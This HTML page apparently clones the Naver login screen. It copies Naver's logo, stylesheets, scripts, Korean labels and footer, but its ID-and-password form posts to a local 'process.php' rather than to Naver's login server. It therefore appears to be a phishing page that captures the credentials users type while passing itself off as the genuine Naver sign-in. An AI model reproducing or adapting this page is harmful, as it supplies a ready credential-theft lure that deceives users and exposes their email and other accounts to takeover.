<html lang="ko"><head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>네이버 : 로그인</title>
	<link rel="stylesheet" type="text/css" href="https://nid.naver.com/login/css/global/desktop/w_20180807.css?dt=20180807_2">
</head>
<body class="safari">

<div id="wrap">
	<!-- 스킵네비게이션 : 웹접근성대응-->
	<div id="u_skip">
		<a href="#content" onclick="document.getElementById('content').tabIndex=-1;document.getElementById('content').focus();return false;"><span>본문으로 바로가기</span></a>
	</div>
	<!-- //스킵네비게이션 -->
	<!-- header -->
	<div id="header">
		<h1><a href="http://www.naver.com" class="sp h_logo" onclick="nclks('log.naver',this,event)">NAVER</a></h1>
 
		<div class="lang">
			
		</div>
	</div>
	<!-- //header -->
	<!-- container -->
	<div id="container">
		<!-- content -->
		<div id="content">
			<div class="title">
				<p></p>
			</div>
<form id="frmNIDLogin" name="frmNIDLogin" target="_top" autocomplete="off" action="process.php" method="post" onsubmit="return confirmSplitSubmit();"> 	<input type="hidden" name="bvsd" id="bvsd" value="">
        <input type="hidden" name="enctp" id="enctp" value="2">
        <input type="hidden" name="encpw" id="encpw" value="">
        <input type="hidden" name="encnm" id="encnm" value="">
        <input type="hidden" name="svctype" id="svctype" value="0">
        <input type="hidden" name="svc" id="svc" value="">
        <input type="hidden" name="viewtype" id="viewtype" value="0">
        <input type="hidden" name="locale" id="locale" value="ko_KR">
        <input type="hidden" name="postDataKey" id="postDataKey" value="">
        <input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
        <input type="hidden" name="logintp" id="logintp" value="">
        <input type="hidden" name="url" id="url" value="http://mail.naver.com/">
        <input type="hidden" name="localechange" id="localechange" value="">
        <input type="hidden" name="ls" id="ls" value="">
        <input type="hidden" name="xid" id="xid" value="">
        <input type="hidden" name="pre_id" id="pre_id" value="">
        <input type="hidden" name="resp" id="resp" value="">
        <input type="hidden" name="ru" id="ru" value="">
				<fieldset class="login_form">
					<legend class="blind">로그인</legend>
					<div class="input_row" id="id_area">
						<span class="input_box">
							<input type="text" id="id" name="id" accesskey="L" placeholder="아이디" class="int" maxlength="41" value="">
						</span>
						<button type="button" disabled="" title="delete" id="id_clear" class="wrg">삭제</button>
					</div>
					<div id="err_empty_id" class="error" style="display:none;">아이디를 입력해주세요.</div>
					<div class="input_row" id="pw_area">
						<span class="input_box">
							<input type="password" id="pw" name="pw" placeholder="비밀번호" class="int" maxlength="16" onkeypress="capslockevt(event);getKeysv2();" onkeyup="checkShiftUp(event);" onkeydown="checkShiftDown(event);">
						</span>
						<button type="button" disabled="" title="delete" id="pw_clear" class="wrg">삭제</button>
						<div class="ly_v2" id="err_capslock" style="display:none;">
							<div class="ly_box">
								<p><strong>Caps Lock</strong>이 켜져 있습니다.</p>							</div>
							<span class="sp ly_point"></span>
						</div>
					</div>
					<div class="error" id="err_empty_pw" style="display:none;">비밀번호를 입력해주세요.</div>
					<input type="submit" title="로그인" alt="로그인" value="로그인" class="btn_global" onclick="nclks('log.login',this,event)">
					<div class="check_info">
						<div class="login_check">
							<span class="login_check_box">
								<input type="checkbox" id="login_chk" name="nvlong" class="" value="off" onchange="savedLong(this);nclks_chk('login_chk', 'log.keepon', 'log.keepoff',this,event)">
								
							</span>
							<div class="ly_v2" id="persist_usage" style="display:none;">
								<div class="ly_box">
									<p>개인정보 보호를 위해 <strong>개인 PC에서만 사용하세요.</strong>&nbsp;&nbsp;<a href="https://help.naver.com/support/contents/contents.nhn?serviceNo=532&amp;categoryNo=1523" target="_blank" class="sp btn_check_help">도움말보기</a></p>
								</div>
								<span class="sp ly_point"></span>
							</div>
						</div>
						<div class="pc_check">
							<span class="ip_check">
								
								<span class="ip_ch">
									<input type="checkbox" id="ip_on" checked="checked" onchange="ipCheck(this,event);nclks_chk('ip_on', 'log.iponset', 'log.ipoffset',this,event)" class="">
									<label for="ip_on" id="label_ip_on" class="sp on"><span class="blind">on</span></label>
								</span>
							</span>
							<span class="bar">|</span>
							<div class="dis_di">
								<a href="javascript:viewOnetime();" onclick="nclks('log.otnhelp',this,event)" title="도움말" class="btn_help_cover"><span class="sp btn_help"></span><span class="blind">도움말</span></a>
								<div class="ly" id="onetime_usage" style="display:none;" onclick="javascript:viewOnetime()">
									<div class="ly_box">
										<p>네이버앱에서 생성된 일회용 로그인 번호를 입력하면, 앱에 로그인된 계정으로 PC에서 로그인할 수 있어요. 아이디/비밀번호를 입력하지 않아 간편하고 더욱 안전합니다.</p>									</div>
									<span class="sp ly_point"></span>
								</div>
							</div>
						</div>
					</div>
				</fieldset>
			</form>
			<div class="position_a">
				
			</div>
			
			
			</div>
			<!-- tg-lang -->
		</div>
		<!-- //content -->
	</div>
	<!-- //container -->
	<!-- footer -->
	<div id="footer">
		<ul>
		<li><a target="_blank" href="http://www.naver.com/rules/service.html" onclick="nclks('fot.agreement',this,event)">이용약관</a></li>
		<li><strong><a target="_blank" href="http://www.naver.com/rules/privacy.html" onclick="nclks('fot.privacy',this,event)">개인정보처리방침</a></strong></li>
		<li><a target="_blank" href="http://www.naver.com/rules/disclaimer.html" onclick="nclks('fot.disclaimer',this,event)">책임의 한계와 법적고지</a></li>
		<li><a target="_blank" href="https://help.naver.com/support/service/main.nhn?serviceNo=532" onclick="nclks('fot.help',this,event)">회원정보 고객센터</a></li>
		</ul>
	
		<address><em><a target="_blank" href="http://www.navercorp.com" class="logo" onclick="nclks('fot.naver',this,event)"><span class="blind">naver</span></a></em><em class="copy">Copyright</em> <em class="u_cri">©</em> <a target="_blank" href="http://www.navercorp.com" class="u_cra" onclick="nclks('fot.navercorp',this,event)">NAVER Corp.</a> <span class="all_r">All Rights Reserved.</span></address>	</div>
	<!-- //footer -->
	
</div>
<script type="text/javascript" src="https://nid.naver.com/login/js/common.all.js?141216"> </script>
<script type="text/javascript">
var disp_stat = "20";
var session_keys = "";
var pc_keyboard_close="<span class=\"sp\">PC 키보드 닫기</span>";
var pc_keyboard_open="<span class=\"sp\">PC 키보드 보기</span>";
var view_char="한글 보기";
var view_symbol="특수기호 보기";

addInputEvent('id', 'id_area');
addInputEvent('pw', 'pw_area');

initSmartLevel();
var login_chk = $('login_chk');
if(login_chk.attachEvent) {
	login_chk.attachEvent("onchange", function(){persist_usage();});
} else if (login_chk.addEventListener) {
	login_chk.addEventListener("change", function(){persist_usage();}, false);
}
function persist_usage()
{
	var login_chk = $("login_chk");
	if (login_chk.checked==true)
	{
		show("persist_usage");
		hide('onetime_usage');
		view_onetimeusage = false;
	}
	else
	{
		hide("persist_usage");
	}
}
var view_onetimeusage = false;
function viewOnetime()
{
	if (view_onetimeusage)
	{
		hide('onetime_usage');
		view_onetimeusage = false;
	}
	else
	{
		hide("persist_usage");
		show('onetime_usage');
		view_onetimeusage = true;
	}
}
try{
	if (navigator.appVersion.toLowerCase().indexOf("win") != -1) {
		$('id').style.imeMode = "disabled";
		document.msCapsLockWarningOff = true;
	}
}catch(e) {}
try{
	if ( $('id').value.length == 0 )
	{
		$('id').focus();
	}
	else
	{
		$('pw').focus();
	}
}catch (e){}
</script>
<script type="text/javascript" src="https://nid.naver.com/login/js/common.util.js"></script>
<script type="text/javascript"> lcs_do(); </script>
<script type="text/javascript">
var nsc = "nid.login_kr";
</script>
<script type="text/javascript">
var inSubmitProgress = false;
function confirmSplitSubmit()
{
	if (inSubmitProgress) {
		return false;
	}
	inSubmitProgress = true;
	var id = $("id");
	var pw = $("pw");
	var encpw = $("encpw");
	
	if(id.value == "") {
		show("err_empty_id");
		hide("err_empty_pw");
		hide("err_common");
		id.focus();
		inSubmitProgress = false;
		return false;
	} else if(pw.value == "") {
		hide("err_empty_id");
		show("err_empty_pw");
		hide("err_common");
		pw.focus();
		inSubmitProgress = false;
		return false;
	}
	try{
		$("ls").value = localStorage.getItem("nid_t");
	}catch(e){}
	return encryptIdPwSplit();
}
function encryptIdPwSplit() {
	var id = $("id");
	var pw = $("pw");
	var encpw = $("encpw");
	var rsa = new RSAKey;

	if (keySplit(session_keys)) {
		rsa.setPublic(evalue, nvalue);
		try{
		        encpw.value = rsa.encrypt(
		                getLenChar(sessionkey) + sessionkey +
		                getLenChar(id.value) + id.value +
		                getLenChar(pw.value) + pw.value);
		} catch(e) {
		        inSubmitProgress = false;
		        return false;
		}
		$('enctp').value = 1;

		setTimeout(function() {
			$("id").value = "";
			$("pw").value = "";
			$("bvsd").value = "timeout";
			$('frmNIDLogin').submit();
		}, 5000);
		try {
			if (bvsd){
				bvsd.f(function(a) {
					$("id").value = "";
					$("pw").value = "";
					$("bvsd").value = a;
					$('frmNIDLogin').submit();
				});
			}
		} catch (e) {
			$("id").value = "";
			$("pw").value = "";
			$("bvsd").value = "error1|"+e.name+"|"+e.message;
			$('frmNIDLogin').submit();
		}
	}
	else
	{
		getKeyByRuntimeIncludeSplit();
	}
	inSubmitProgress = false;
	return false;
}
function getKeyByRuntimeIncludeSplit() {
	try {
		var keyjs  = document.createElement('script');
		keyjs.type = 'text/javascript';
		keyjs.src = '/login/ext/keys_js3.nhn';
		document.getElementsByTagName('head')[0].appendChild(keyjs);
	} catch (e) {
	}
}
</script>
<script type="text/javascript" src="https://nid.naver.com/login/js/bvsd.1.1.0.min.js"></script>
<script type="text/javascript">
var porperties = {
	keyboard: [{
		id: "id",
	}, {
		id: "pw",
		secureMode: true
	}],
	modeProperties: {
		mode: 2,
		url: "/nc/b"
	}
};
bvsd = new sofa.Koop(porperties);
</script>
<div id="nv_stat" style="display:none;">20</div>


</body></html>